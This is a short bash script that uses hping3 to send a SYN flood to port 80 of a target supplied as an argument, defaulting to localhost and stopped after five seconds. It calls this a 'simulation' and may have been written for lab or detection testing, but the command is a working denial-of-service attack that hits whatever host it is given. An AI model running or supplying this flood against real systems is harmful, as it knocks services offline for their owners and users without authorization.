#!/bin/bash
TARGET=${1:-127.0.0.1}
echo "[*] Simulating SYN Flood against $TARGET..."
timeout 5s sudo hping3 -S -p 80 --flood $TARGET
echo "[+] SYN Flood finished."
